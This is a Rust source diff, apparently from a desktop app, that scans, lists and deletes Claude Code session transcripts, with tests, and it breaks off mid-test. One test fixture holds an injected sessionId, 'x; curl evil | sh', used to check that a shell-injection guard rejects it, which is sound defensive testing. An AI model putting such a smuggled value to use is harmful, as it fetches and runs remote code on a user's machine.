@@ -1,41 +1,90 @@
+use std::collections::{HashMap, HashSet};
 use std::fs;
-use std::io::{BufRead, BufReader};
+use std::io::{BufRead, BufReader, Read, Seek, SeekFrom};
 use std::path::{Path, PathBuf};
 use std::time::SystemTime;
 
-use chrono::{DateTime, Utc};
+use chrono::{DateTime, SecondsFormat, Utc};
 use directories::BaseDirs;
 use serde::Serialize;
 
-/// Maximum number of JSONL lines scanned per session file to locate metadata and
-/// the first user prompt. Sessions put sessionId/gitBranch on line 1 and the
-/// first user message usually within the first few lines; 80 is a conservative
-/// upper bound that tolerates heavy caveat preambles without reading the whole
-/// transcript.
-const MAX_LINES_SCANNED: usize = 80;
+/// Maximum number of JSONL lines parsed from the head of a transcript while
+/// looking for metadata and the first user prompt.
+///
+/// This used to be 80, which silently *discarded* any transcript whose
+/// `sessionId` appeared later than that (the parser returned `None` and the
+/// file vanished from the listing with no log). The id now also falls back to
+/// the file name, so this bound only limits how hard we look — it can no
+/// longer lose a session.
+const MAX_LINES_SCANNED: usize = 500;
 
-/// Maximum sessions returned from [`list_claude_sessions`]. The picker in the UI
-/// surfaces the most recent sessions; a user with more than this is almost
-/// certainly better served by searching rather than scrolling.
+/// Byte ceiling on the head scan. A transcript line can be megabytes (a pasted
+/// file, a base64 attachment), so bounding lines alone does not bound memory.
+const HEAD_SCAN_BYTES: u64 = 1024 * 1024;
+
+/// Bytes read back from the end of a transcript to recover the last message
+/// timestamp and a summary of the last activity. Deliberately small: transcripts
+/// reach tens of megabytes and this runs for every file on sidebar render.
+const TAIL_SCAN_BYTES: u64 = 256 * 1024;
+
+/// Maximum sessions returned from [`list_claude_sessions`]. Anything cut by
+/// this is reported through [`ClaudeSessionListing::truncated`] rather than
+/// disappearing.
 const MAX_SESSIONS_RETURNED: usize = 50;
 
-/// Maximum characters kept from a first-prompt preview. Enough to distinguish
-/// sessions in the picker without overflowing the card.
+/// Maximum characters kept from a first-prompt / last-activity preview. Enough
+/// to distinguish sessions in the picker without overflowing the card.
 const MAX_PROMPT_CHARS: usize = 200;
 
 #[derive(Debug, Clone, Serialize)]
 pub struct ClaudeSessionInfo {
     pub session_id: String,
     pub first_prompt: Option<String>,
+    /// Preview of the most recent user/assistant message in the transcript.
+    ///
+    /// The opening line alone does not identify a long conversation — two runs
+    /// of the same slash command look identical until you see where they ended
+    /// up. Truncated the same way as `first_prompt`.
+    pub last_activity: Option<String>,
     pub started_at: String,
+    /// Timestamp of the last message in the transcript (RFC3339, UTC).
+    ///
+    /// Falls back to the file mtime only when no message carries a timestamp.
+    /// mtime alone is not reliable: transcripts get touched after the
+    /// conversation ends (observed drift of ~16h on a real file), which pushed
+    /// stale sessions to the top of the list.
     pub last_active: String,
+    /// Number of JSONL entries in the transcript — a cheap proxy for how long
+    /// the conversation was. Counts every entry, including tool traffic.
+    pub message_count: usize,
     pub git_branch: Option<String>,
     /// Directory the conversation ran in, as recorded in the transcript.
     ///
     /// `claude --resume <id>` only finds a session when the shell's cwd maps to
     /// the same `~/.claude/projects/<encoded-cwd>/` directory the transcript
     /// lives in, so a resume launch must run here and nowhere else.
+    ///
+    /// Reported even when the directory is gone — see [`Self::cwd_exists`].
+    /// Blanking it here made the resume target ambiguous: the caller silently
+    /// retargeted to the project path with no way to say so.
     pub cwd: Option<String>,
+    /// Whether [`Self::cwd`] still exists on disk. `false` means a resume
+    /// launched there would fail, so the caller must warn (and fall back).
+    pub cwd_exists: bool,
+}
+
+/// Result of a session listing: the rows plus everything that was *not*
+/// returned, so the UI can say why instead of showing a short list.
+#[derive(Debug, Clone, Default, Serialize)]
+pub struct ClaudeSessionListing {
+    pub sessions: Vec<ClaudeSessionInfo>,
+    /// Unique conversations discovered before [`MAX_SESSIONS_RETURNED`] was applied.
+    pub total_found: usize,
+    /// `true` when `sessions` is shorter than `total_found`.
+    pub truncated: bool,
+    /// Transcripts that could not be parsed (no usable session id, unreadable
+    /// file, or an id rejected by the resume-injection guard). Logged as well.
+    pub unreadable: usize,
 }
 
 /// System XML tags that indicate a non-user message (should be skipped entirely).
@@ -109,6 +158,26 @@ fn extract_prompt_text(content: &str) -> String {
     content.trim().to_string()
 }
 
+/// Pulls readable text out of a transcript entry's `message.content`, which is
+/// either a bare string or an array of content blocks. Tool-only entries
+/// (`tool_use` / `tool_result` blocks) yield `None` so the caller keeps looking.
+fn message_text(val: &serde_json::Value) -> Option<String> {
+    let content = val.get("message")?.get("content")?;
+    if let Some(s) = content.as_str() {
+        return Some(s.to_string());
+    }
+    content.as_array()?.iter().find_map(|block| {
+        if block.get("type").and_then(|t| t.as_str()) == Some("text") {
+            block
+                .get("text")
+                .and_then(|t| t.as_str())
+                .map(|s| s.to_string())
+        } else {
+            None
+        }
+    })
+}
+
 /// Encodes a filesystem path into Claude Code's projects-directory naming scheme.
 ///
 /// Empirically, Claude Code replaces every character that isn't ASCII alphanumeric,
@@ -154,16 +223,97 @@ fn canonical_project_path(project_path: &str) -> String {
     canonical
 }
 
+/// `~/.claude/projects` — the root Claude Code files every transcript under.
+fn claude_projects_root() -> Option<PathBuf> {
+    let base_dirs = BaseDirs::new()?;
+    Some(base_dirs.home_dir().join(".claude").join("projects"))
+}
+
 /// Converts a project path to Claude's session directory
 /// `~/.claude/projects/<encoded-path>/`.
 fn project_path_to_claude_dir(project_path: &str) -> Option<PathBuf> {
-    let base_dirs = BaseDirs::new()?;
-    let home = base_dirs.home_dir();
-    Some(
-        home.join(".claude")
-            .join("projects")
-            .join(encode_project_path(project_path)),
-    )
+    Some(claude_projects_root()?.join(encode_project_path(project_path)))
+}
+
+/// Comparable form of a filesystem path: forward slashes, no trailing
+/// separator, lowercased.
+///
+/// Deliberately OS-independent — the same transcript is read on Windows and in
+/// CI on Linux, and the recorded `cwd` keeps whatever spelling the machine that
+/// wrote it used.
+fn normalize_path_key(path: &str) -> String {
+    path.replace('\\', "/").trim_end_matches('/').to_lowercase()
+}
+
+/// Whether `child` is `parent` or lives underneath it.
+fn path_is_within(child: &str, parent: &str) -> bool {
+    let child = normalize_path_key(child);
+    let parent = normalize_path_key(parent);
+    if parent.is_empty() {
+        return false;
+    }
+    child == parent || child.starts_with(&format!("{parent}/"))
+}
+
+/// A transcript directory worth scanning for one project.
+#[derive(Debug, Clone)]
+struct SessionDir {
+    path: PathBuf,
+    /// When set, only sessions whose recorded `cwd` lives under this path are
+    /// kept.
+    ///
+    /// The encoding is lossy — `/`, `.`, ` ` and `-` all become `-` — so
+    /// `C:\git\maestro-old` encodes to a name that starts with the same
+    /// `C--git-maestro-` prefix as a real subdirectory of `C:\git\maestro`.
+    /// Directory names get us the cheap candidate set; the recorded `cwd`
+    /// (already parsed) settles membership without touching extra files.
+    require_within: Option<String>,
+}
+
+/// Every transcript directory that can hold conversations belonging to
+/// `canonical_project`.
+///
+/// 1. the project's own encoded directory,
+/// 2. one directory per caller-supplied extra root (registered worktrees, which
+///    Maestro keeps *outside* the repo so no prefix can reach them),
+/// 3. every directory whose name starts with the project's encoded prefix —
+///    repo subdirectories and worktrees that lived inside the repo, including
+///    ones that have since been deleted.
+///
+/// Directory names only: no transcript is opened to decide membership.
+fn session_dirs(root: &Path, canonical_project: &str, extra_roots: &[String]) -> Vec<SessionDir> {
+    let mut dirs: Vec<SessionDir> = Vec::new();
+    let mut seen: HashSet<String> = HashSet::new();
+    let mut push = |dirs: &mut Vec<SessionDir>, path: PathBuf, require_within: Option<String>| {
+        let key = normalize_path_key(&path.to_string_lossy());
+        if !path.is_dir() || !seen.insert(key) {
+            return;
+        }
+        dirs.push(SessionDir {
+            path,
+            require_within,
+        });
+    };
+
+    let encoded = encode_project_path(canonical_project);
+    push(&mut dirs, root.join(&encoded), None);
+
+    for extra in extra_roots {
+        let encoded_extra = encode_project_path(&canonical_project_path(extra));
+        push(&mut dirs, root.join(encoded_extra), None);
+    }
+
+    let prefix = format!("{encoded}-");
+    if let Ok(entries) = fs::read_dir(root) {
+        for entry in entries.flatten() {
+            let name = entry.file_name().to_string_lossy().into_owned();
+            if name.starts_with(&prefix) {
+                push(&mut dirs, entry.path(), Some(canonical_project.to_string()));
+            }
+        }
+    }
+
+    dirs
 }
 
 /// Most recently modified `*.jsonl` in `dir` — the newest transcript.
@@ -219,17 +369,34 @@ fn is_safe_session_id(session_id: &str) -> bool {
         .all(|c| c.is_ascii_hexdigit() || c == '-')
 }
 
-/// Parses session info from a JSONL transcript file.
-fn parse_session_file(path: &Path) -> Option<ClaudeSessionInfo> {
-    let file = fs::File::open(path).ok()?;
-    let reader = BufReader::new(file);
+/// Metadata recovered from the beginning of a transcript.
+#[derive(Debug, Default)]
+struct HeadInfo {
+    session_id: Option<String>,
+    git_branch: Option<String>,
+    started_at: Option<String>,
+    first_prompt: Option<String>,
+    cwd: Option<String>,
+}
 
-    let mut session_id: Option<String> = None;
-    let mut git_branch: Option<String> = None;
-    let mut started_at: Option<String> = None;
-    let mut first_prompt: Option<String> = None;
-    let mut cwd: Option<String> = None;
+/// Metadata recovered from the end of a transcript.
+#[derive(Debug, Default)]
+struct TailInfo {
+    last_timestamp: Option<String>,
+    last_activity: Option<String>,
+    git_branch: Option<String>,
+    cwd: Option<String>,
+}
 
+/// Parses the head of a transcript for identity, the first user prompt and the
+/// directory the conversation ran in. Bounded by both lines and bytes.
+fn scan_head(file: &mut fs::File) -> HeadInfo {
+    let mut info = HeadInfo::default();
+    if file.seek(SeekFrom::Start(0)).is_err() {
+        return info;
+    }
+
+    let reader = BufReader::new(file.by_ref().take(HEAD_SCAN_BYTES));
     for (i, line) in reader.lines().enumerate() {
         if i >= MAX_LINES_SCANNED {
             break;
@@ -247,108 +414,300 @@ fn parse_session_file(path: &Path) -> Option<ClaudeSessionInfo> {
             Err(_) => continue,
         };
 
-        // Extract sessionId and gitBranch from the first entry
-        if session_id.is_none() {
+        if info.session_id.is_none() {
             if let Some(sid) = val.get("sessionId").and_then(|v| v.as_str()) {
-                session_id = Some(sid.to_string());
+                info.session_id = Some(sid.to_string());
             }
         }
-        if git_branch.is_none() {
+        if info.git_branch.is_none() {
             if let Some(branch) = val.get("gitBranch").and_then(|v| v.as_str()) {
-                git_branch = Some(branch.to_string());
+                info.git_branch = Some(branch.to_string());
             }
         }
-        if started_at.is_none() {
+        if info.started_at.is_none() {
             if let Some(ts) = val.get("timestamp").and_then(|v| v.as_str()) {
-                started_at = Some(ts.to_string());
+                info.started_at = Some(ts.to_string());
             }
         }
-        if cwd.is_none() {
+        if info.cwd.is_none() {
             if let Some(dir) = val.get("cwd").and_then(|v| v.as_str()) {
-                cwd = Some(dir.to_string());
+                info.cwd = Some(dir.to_string());
             }
         }
 
         // Look for the first real user message (skip system-generated messages)
-        if first_prompt.is_none() {
-            if let Some("user") = val.get("type").and_then(|v| v.as_str()) {
-                let raw = val
-                    .get("message")
-                    .and_then(|m| m.get("content"))
-                    .and_then(|c| {
-                        // content can be a string or an array of content blocks
-                        if let Some(s) = c.as_str() {
-                            Some(s.to_string())
-                        } else if let Some(arr) = c.as_array() {
-                            arr.iter().find_map(|block| {
-                                if block.get("type").and_then(|t| t.as_str()) == Some("text") {
-                                    block
-                                        .get("text")
-                                        .and_then(|t| t.as_str())
-                                        .map(|s| s.to_string())
-                                } else {
-                                    None
-                                }
-                            })
-                        } else {
-                            None
-                        }
-                    });
-
-                if let Some(content) = raw {
-                    // Skip system-generated messages (caveats, bash I/O, etc.)
-                    if is_system_message(&content) {
-                        continue;
-                    }
-                    let clean = extract_prompt_text(&content);
-                    if !clean.is_empty() {
-                        first_prompt = Some(truncate_chars(&clean, MAX_PROMPT_CHARS));
-                    }
+        if info.first_prompt.is_none() && val.get("type").and_then(|v| v.as_str()) == Some("user") {
+            if let Some(content) = message_text(&val) {
+                // Skip system-generated messages (caveats, bash I/O, etc.)
+                if is_system_message(&content) {
+                    continue;
+                }
+                let clean = extract_prompt_text(&content);
+                if !clean.is_empty() {
+                    info.first_prompt = Some(truncate_chars(&clean, MAX_PROMPT_CHARS));
                 }
             }
         }
 
         // Stop early if we have everything
-        if session_id.is_some() && first_prompt.is_some() && cwd.is_some() {
+        if info.session_id.is_some() && info.first_prompt.is_some() && info.cwd.is_some() {
             break;
         }
     }
 
-    let session_id = session_id?;
+    info
+}
+
+/// Reads the last [`TAIL_SCAN_BYTES`] of a transcript and walks the entries
+/// backwards for the real last-message timestamp and a preview of what the
+/// conversation ended up doing.
+///
+/// Seeking rather than streaming is the point: transcripts reach tens of
+/// megabytes and this runs per file on sidebar render.
+fn scan_tail(file: &mut fs::File, len: u64) -> TailInfo {
+    let mut info = TailInfo::default();
+    if len == 0 {
+        return info;
+    }
+
+    let start = len.saturating_sub(TAIL_SCAN_BYTES);
+    if file.seek(SeekFrom::Start(start)).is_err() {
+        return info;
+    }
+    let mut buf = Vec::new();
+    if file
+        .by_ref()
+        .take(TAIL_SCAN_BYTES)
+        .read_to_end(&mut buf)
+        .is_err()
+    {
+        return info;
+    }
+
+    let text = String::from_utf8_lossy(&buf);
+    let mut lines: Vec<&str> = text.split('\n').collect();
+    // The window almost certainly starts mid-line; that fragment is not JSON.
+    if start > 0 && !lines.is_empty() {
+        lines.remove(0);
+    }
+
+    for line in lines.iter().rev() {
+        let line = line.trim();
+        if line.is_empty() {
+            continue;
+        }
+        let val: serde_json::Value = match serde_json::from_str(line) {
+            Ok(v) => v,
+            Err(_) => continue,
+        };
+
+        if info.last_timestamp.is_none() {
+            if let Some(ts) = val.get("timestamp").and_then(|v| v.as_str()) {
+                info.last_timestamp = Some(ts.to_string());
+            }
+        }
+        if info.cwd.is_none() {
+            if let Some(dir) = val.get("cwd").and_then(|v| v.as_str()) {
+                info.cwd = Some(dir.to_string());
+            }
+        }
+        if info.git_branch.is_none() {
+            if let Some(branch) = val.get("gitBranch").and_then(|v| v.as_str()) {
+                info.git_branch = Some(branch.to_string());
+            }
+        }
+        if info.last_activity.is_none() {
+            let kind = val.get("type").and_then(|v| v.as_str()).unwrap_or_default();
+            if kind == "user" || kind == "assistant" {
+                if let Some(content) = message_text(&val) {
+                    if !is_system_message(&content) {
+                        let clean = extract_prompt_text(&content);
+                        if !clean.is_empty() {
+                            info.last_activity = Some(truncate_chars(&clean, MAX_PROMPT_CHARS));
+                        }
+                    }
+                }
+            }
+        }
+
+        if info.last_timestamp.is_some()
+            && info.last_activity.is_some()
+            && info.cwd.is_some()
+            && info.git_branch.is_some()
+        {
+            break;
+        }
+    }
+
+    info
+}
+
+/// Counts JSONL entries by scanning for newlines through a fixed buffer — no
+/// JSON parsing and no whole-file allocation, so a 20 MB transcript costs one
+/// sequential read and 64 KB of memory.
+fn count_entries(file: &mut fs::File) -> usize {
+    if file.seek(SeekFrom::Start(0)).is_err() {
+        return 0;
+    }
+    let mut buf = vec![0u8; 64 * 1024];
+    let mut count = 0usize;
+    let mut last_byte = b'\n';
+    loop {
+        match file.read(&mut buf) {
+            Ok(0) => break,
+            Ok(n) => {
+                count += buf[..n].iter().filter(|b| **b == b'\n').count();
+                last_byte = buf[n - 1];
+            }
+            Err(_) => break,
+        }
+    }
+    // A final entry without a trailing newline still counts.
+    if last_byte != b'\n' {
+        count += 1;
+    }
+    count
+}
+
+/// Parses session info from a JSONL transcript file.
+///
+/// `None` means the file is unusable (unreadable, no id-shaped identity, or an
+/// id the resume guard rejects). Callers count and log those rather than
+/// dropping them silently.
+fn parse_session_file(path: &Path) -> Option<ClaudeSessionInfo> {
+    let mut file = fs::File::open(path).ok()?;
+    let metadata = file.metadata().ok()?;
+
+    let head = scan_head(&mut file);
+    let tail = scan_tail(&mut file, metadata.len());
+    let message_count = count_entries(&mut file);
 
     // The id is later interpolated into `claude --resume <id>` and written to a
     // shell PTY, so a transcript whose sessionId is not a UUID-shaped token
     // (e.g. an attacker-planted file containing shell metacharacters) must never
     // reach the resume picker.
-    if !is_safe_session_id(&session_id) {
-        log::warn!(
-            "Skipping Claude session with unsafe sessionId in {}",
-            path.display()
-        );
-        return None;
-    }
+    let session_id = match head.session_id {
+        Some(id) => {
+            if !is_safe_session_id(&id) {
+                log::warn!(
+                    "Skipping Claude session with unsafe sessionId in {}",
+                    path.display()
+                );
+                return None;
+            }
+            id
+        }
+        // Claude names each transcript `<session-id>.jsonl`, so the file name is
+        // an authoritative fallback when the id is not in the scanned head. It
+        // goes through the same guard — the name comes off the filesystem.
+        None => {
+            let stem = path.file_stem()?.to_string_lossy().into_owned();
+            if !is_safe_session_id(&stem) {
+                log::warn!(
+                    "Skipping Claude transcript with no usable session id: {}",
+                    path.display()
+                );
+                return None;
+            }
+            stem
+        }
+    };
 
-    // Get file modification time for last_active
-    let metadata = fs::metadata(path).ok()?;
-    let mtime = metadata.modified().ok().unwrap_or(SystemTime::UNIX_EPOCH);
-    let last_active: DateTime<Utc> = mtime.into();
+    // Prefer the last message's own timestamp; the file mtime is only a
+    // fallback because transcripts get touched long after the conversation
+    // ended, which reorders the list.
+    let last_active: DateTime<Utc> = tail
+        .last_timestamp
+        .as_deref()
+        .and_then(|ts| DateTime::parse_from_rfc3339(ts).ok())
+        .map(|ts| ts.with_timezone(&Utc))
+        .unwrap_or_else(|| metadata.modified().unwrap_or(SystemTime::UNIX_EPOCH).into());
 
-    // A recorded cwd that no longer exists (deleted worktree) cannot host a
-    // resume — the shell would fail to spawn there — so drop it and let the
-    // caller fall back to the project path.
-    let cwd = cwd.filter(|dir| Path::new(dir).is_dir());
+    let cwd = head.cwd.or(tail.cwd);
+    let cwd_exists = cwd.as_deref().is_some_and(|dir| Path::new(dir).is_dir());
 
     Some(ClaudeSessionInfo {
         session_id,
-        first_prompt,
-        started_at: started_at.unwrap_or_default(),
-        last_active: last_active.to_rfc3339(),
-        git_branch,
+        first_prompt: head.first_prompt,
+        last_activity: tail.last_activity,
+        started_at: head.started_at.unwrap_or_default(),
+        last_active: last_active.to_rfc3339_opts(SecondsFormat::Millis, true),
+        message_count,
+        git_branch: head.git_branch.or(tail.git_branch),
         cwd,
+        cwd_exists,
     })
 }
 
+/// Scans every transcript directory belonging to `canonical_project` and builds
+/// the listing. Split out of the command so tests can point it at a tempdir.
+fn collect_sessions(
+    root: &Path,
+    canonical_project: &str,
+    extra_roots: &[String],
+) -> ClaudeSessionListing {
+    let mut by_id: HashMap<String, ClaudeSessionInfo> = HashMap::new();
+    let mut unreadable = 0usize;
+
+    for dir in session_dirs(root, canonical_project, extra_roots) {
+        let entries = match fs::read_dir(&dir.path) {
+            Ok(entries) => entries,
+            Err(e) => {
+                log::warn!("Cannot read Claude session dir {}: {e}", dir.path.display());
+                continue;
+            }
+        };
+
+        for entry in entries.flatten() {
+            let path = entry.path();
+            if path.extension().and_then(|e| e.to_str()) != Some("jsonl") {
+                continue;
+            }
+            let Some(info) = parse_session_file(&path) else {
+                unreadable += 1;
+                log::warn!("Unreadable Claude transcript: {}", path.display());
+                continue;
+            };
+            // Prefix-matched directories can belong to a sibling path; the
+            // recorded cwd decides. A transcript with no cwd keeps the
+            // directory name's verdict.
+            if let (Some(root_path), Some(cwd)) = (&dir.require_within, &info.cwd) {
+                if !path_is_within(cwd, root_path) {
+                    continue;
+                }
+            }
+            // The same conversation is written to every directory it was
+            // resumed from; keep the freshest copy.
+            match by_id.get(&info.session_id) {
+                Some(seen) if seen.last_active >= info.last_active => {}
+                _ => {
+                    by_id.insert(info.session_id.clone(), info);
+                }
+            }
+        }
+    }
+
+    let mut sessions: Vec<ClaudeSessionInfo> = by_id.into_values().collect();
+    // Timestamps are all emitted as fixed-width UTC (`...Z`), so the string
+    // order is the chronological order.
+    sessions.sort_by(|a, b| b.last_active.cmp(&a.last_active));
+
+    let total_found = sessions.len();
+    sessions.truncate(MAX_SESSIONS_RETURNED);
+
+    ClaudeSessionListing {
+        truncated: total_found > sessions.len(),
+        sessions,
+        total_found,
+        unreadable,
+    }
+}
+
 /// Deletes a Claude Code session's JSONL transcript and optional snapshot directory.
+///
+/// Searches the same directories the listing does, otherwise deleting a
+/// conversation surfaced from a subdirectory or worktree would silently do
+/// nothing.
 #[tauri::command]
 pub async fn delete_claude_session(
     project_path: String,
@@ -359,67 +718,70 @@ pub async fn delete_claude_session(
     }
 
     let canonical = canonical_project_path(&project_path);
+    let root =
+        claude_projects_root().ok_or_else(|| "Could not determine home directory".to_string())?;
 
-    let claude_dir = project_path_to_claude_dir(&canonical)
-        .ok_or_else(|| "Could not determine home directory".to_string())?;
+    for dir in session_dirs(&root, &canonical, &[]) {
+        // Delete the JSONL transcript
+        let jsonl_path = dir.path.join(format!("{session_id}.jsonl"));
+        if jsonl_path.exists() {
+            fs::remove_file(&jsonl_path)
+                .map_err(|e| format!("Failed to delete session file: {e}"))?;
+        }
 
-    // Delete the JSONL transcript
-    let jsonl_path = claude_dir.join(format!("{session_id}.jsonl"));
-    if jsonl_path.exists() {
-        fs::remove_file(&jsonl_path)
-            .map_err(|e| format!("Failed to delete session file: {e}"))?;
-    }
-
-    // Delete the optional snapshot directory (same name without extension)
-    let snapshot_dir = claude_dir.join(&session_id);
-    if snapshot_dir.is_dir() {
-        fs::remove_dir_all(&snapshot_dir)
-            .map_err(|e| format!("Failed to delete session snapshot directory: {e}"))?;
+        // Delete the optional snapshot directory (same name without extension)
+        let snapshot_dir = dir.path.join(&session_id);
+        if snapshot_dir.is_dir() {
+            fs::remove_dir_all(&snapshot_dir)
+                .map_err(|e| format!("Failed to delete session snapshot directory: {e}"))?;
+        }
     }
 
     Ok(())
 }
 
 /// Lists previous Claude Code sessions for a given project path.
+///
 /// Reads session data from Claude's native storage at `~/.claude/projects/`.
+/// `extra_roots` carries directories that cannot be derived from the project
+/// path — registered worktrees, which Maestro keeps outside the repo.
 #[tauri::command]
-pub async fn list_claude_sessions(project_path: String) -> Result<Vec<ClaudeSessionInfo>, String> {
+pub async fn list_claude_sessions(
+    project_path: String,
+    extra_roots: Option<Vec<String>>,
+) -> Result<ClaudeSessionListing, String> {
     // Canonicalize the project path for consistent matching
     let canonical = canonical_project_path(&project_path);
+    let root =
+        claude_projects_root().ok_or_else(|| "Could not determine home directory".to_string())?;
 
-    let claude_dir = project_path_to_claude_dir(&canonical)
-        .ok_or_else(|| "Could not determine home directory".to_string())?;
-
-    if !claude_dir.exists() {
-        return Ok(Vec::new());
+    if !root.exists() {
+        return Ok(ClaudeSessionListing::default());
     }
 
-    let entries =
-        fs::read_dir(&claude_dir).map_err(|e| format!("Failed to read directory: {e}"))?;
-
-    let mut sessions: Vec<ClaudeSessionInfo> = entries
-        .filter_map(|entry| {
-            let entry = entry.ok()?;
-            let path = entry.path();
-            if path.extension().and_then(|e| e.to_str()) == Some("jsonl") {
-                parse_session_file(&path)
-            } else {
-                None
-            }
-        })
-        .collect();
-
-    // Sort by last_active descending (most recent first)
-    sessions.sort_by(|a, b| b.last_active.cmp(&a.last_active));
-
-    sessions.truncate(MAX_SESSIONS_RETURNED);
-
-    Ok(sessions)
+    Ok(collect_sessions(
+        &root,
+        &canonical,
+        &extra_roots.unwrap_or_default(),
+    ))
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// Writes `lines` as a JSONL transcript at `dir/name`.
+    fn write_transcript(dir: &Path, name: &str, lines: &[String]) -> PathBuf {
+        fs::create_dir_all(dir).unwrap();
+        let path = dir.join(name);
+        fs::write(&path, format!("{}\n", lines.join("\n"))).unwrap();
+        path
+    }
+
+    /// A minimal user entry.
+    fn user_line(session_id: &str, text: &str) -> String {
+        format!(r#"{{"sessionId":"{session_id}","type":"user","message":{{"content":"{text}"}}}}"#)
+    }
 
     // ---- is_safe_session_id (resume-injection guard) ---------------------
 
@@ -536,6 +898,32 @@ mod tests {
         // lookups still target a deterministic directory.
         let missing = "/definitely/not/a/real/path-xyz";
         assert_eq!(canonical_project_path(missing), missing);
+    }
+
+    // ---- path_is_within (host-OS independent) -----------------------------
+
+    #[test]
+    fn path_is_within_accepts_both_path_spellings() {
+        // CI runs Linux, developer machines run Windows; the recorded cwd keeps
+        // whatever spelling wrote it, so both must work everywhere.
+        assert!(path_is_within(r"C:\git\maestro\src", r"C:\git\maestro"));
+        assert!(path_is_within("C:/git/maestro/src", r"C:\git\maestro"));
+        assert!(path_is_within("/home/u/repo/src", "/home/u/repo"));
+        assert!(path_is_within("/home/u/repo", "/home/u/repo/"));
+    }
+
+    #[test]
+    fn path_is_within_rejects_dash_prefixed_siblings() {
+        // `maestro-old` shares the encoded prefix of `maestro` but is a
+        // different project.
+        assert!(!path_is_within(r"C:\git\maestro-old", r"C:\git\maestro"));
+        assert!(!path_is_within("/home/u/repo-old", "/home/u/repo"));
+        assert!(!path_is_within("/home/u/other", "/home/u/repo"));
+    }
+
+    #[test]
+    fn path_is_within_is_case_insensitive() {
+        assert!(path_is_within(r"c:\GIT\Maestro\src", r"C:\git\maestro"));
     }
 
     // ---- extract_prompt_text ---------------------------------------------
@@ -673,10 +1061,56 @@ mod tests {
     }
 
     #[test]
-    fn parse_returns_none_without_session_id() {
+    fn parse_returns_none_without_any_usable_session_id() {
+        // No sessionId in the file AND a file name that is not id-shaped:
+        // nothing safe to resume with, so the caller counts it as unreadable.
         let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("abc.jsonl");
+        let path = tmp.path().join("not-a-real-uuid-zzz.jsonl");
         fs::write(&path, r#"{"type":"user","message":{"content":"hi"}}"#).unwrap();
+        assert!(parse_session_file(&path).is_none());
+    }
+
+    #[test]
+    fn parse_falls_back_to_the_file_name_for_the_session_id() {
+        // Claude names each transcript `<session-id>.jsonl`.
+        let tmp = tempfile::tempdir().unwrap();
+        let path = tmp
+            .path()
+            .join("01234567-89ab-cdef-0123-456789abcdef.jsonl");
+        fs::write(&path, r#"{"type":"user","message":{"content":"hi"}}"#).unwrap();
+        let info = parse_session_file(&path).expect("parsed");
+        assert_eq!(info.session_id, "01234567-89ab-cdef-0123-456789abcdef");
+    }
+
+    #[test]
+    fn parse_finds_a_session_id_far_past_the_old_80_line_window() {
+        // Regression: MAX_LINES_SCANNED was 80 and a late sessionId made the
+        // whole transcript disappear. The file name is not id-shaped here, so
+        // only the in-file id can rescue it.
+        let tmp = tempfile::tempdir().unwrap();
+        let mut lines: Vec<String> = (0..200)
+            .map(|i| format!(r#"{{"type":"progress","seq":{i}}}"#))
+            .collect();
+        lines.push(user_line("01234567-89ab-cdef-0123-456789abcdef", "late id"));
+        let path = write_transcript(tmp.path(), "transcript-that-is-not-a-uuid.jsonl", &lines);
+        let info = parse_session_file(&path).expect("parsed");
+        assert_eq!(info.session_id, "01234567-89ab-cdef-0123-456789abcdef");
+        assert_eq!(info.first_prompt.as_deref(), Some("late id"));
+    }
+
+    #[test]
+    fn parse_rejects_an_unsafe_in_file_session_id_without_using_the_file_name() {
+        // The guard must not be bypassable by naming the file after a valid
+        // UUID while the transcript claims a hostile id.
+        let tmp = tempfile::tempdir().unwrap();
+        let path = tmp
+            .path()
+            .join("01234567-89ab-cdef-0123-456789abcdef.jsonl");
+        fs::write(
+            &path,
+            r#"{"sessionId":"x; curl evil | sh","type":"user","message":{"content":"hi"}}"#,
+        )
+        .unwrap();
         assert!(parse_session_file(&path).is_none());
     }
 
@@ -693,18 +1127,21 @@ mod tests {
         let info = parse_session_file(&path).expect("parsed");
         let expected = tmp.path().to_string_lossy().into_owned();
         assert_eq!(info.cwd, Some(expected));
+        assert!(info.cwd_exists);
     }
 
     #[test]
-    fn parse_drops_cwd_when_the_directory_is_gone() {
-        // Deleted worktree: spawning a shell there would fail, so the caller
-        // must fall back to the project path instead.
+    fn parse_reports_a_missing_cwd_instead_of_blanking_it() {
+        // Deleted worktree: the directory is still the resume target the
+        // transcript recorded, so the UI must be able to name it and warn.
+        // Blanking it silently retargeted the launch to the project path.
         let tmp = tempfile::tempdir().unwrap();
         let path = tmp.path().join("abc.jsonl");
         let jsonl = r#"{"sessionId":"abc","cwd":"/gone/worktree-xyz","type":"user","message":{"content":"hi"}}"#;
         fs::write(&path, jsonl).unwrap();
         let info = parse_session_file(&path).expect("parsed");
-        assert_eq!(info.cwd, None);
+        assert_eq!(info.cwd.as_deref(), Some("/gone/worktree-xyz"));
+        assert!(!info.cwd_exists);
     }
 
     #[test]
@@ -715,5 +1152,293 @@ mod tests {
         fs::write(&path, jsonl).unwrap();
         let info = parse_session_file(&path).expect("parsed");
         assert_eq!(info.first_prompt.as_deref(), Some("array form"));
+    }
+
+    #[test]
+    fn parse_counts_entries_and_summarises_the_last_activity() {
+        let tmp = tempfile::tempdir().unwrap();
+        let lines = vec![
+            user_line("abc", "opening line"),
+            r#"{"sessionId":"abc","type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash"}]}}"#.to_string(),
+            r#"{"sessionId":"abc","type":"user","message":{"content":[{"type":"tool_result","content":"out"}]}}"#.to_string(),
+            r#"{"sessionId":"abc","type":"assistant","message":{"content":[{"type":"text","text":"shipped the fix"}]}}"#.to_string(),
+            r#"{"sessionId":"abc","type":"system","subtype":"turn_duration"}"#.to_string(),
+        ];
+        let path = write_transcript(tmp.path(), "abc.jsonl", &lines);
+        let info = parse_session_file(&path).expect("parsed");
+        assert_eq!(info.message_count, 5);
+        assert_eq!(info.first_prompt.as_deref(), Some("opening line"));
+        // Tool-only entries carry no readable text, so the walk continues back.
+        assert_eq!(info.last_activity.as_deref(), Some("shipped the fix"));
+    }
+
+    #[test]
+    fn last_active_uses_the_last_message_not_the_file_mtime() {
+        // Real regression: transcripts get touched long after the conversation
+        // ends (one file on disk drifted ~16h), which floated stale sessions to
+        // the top of the History list.
+        let tmp = tempfile::tempdir().unwrap();
+        let lines = vec![
+            r#"{"sessionId":"abc","timestamp":"2020-01-01T00:00:00.000Z","type":"user","message":{"content":"hi"}}"#.to_string(),
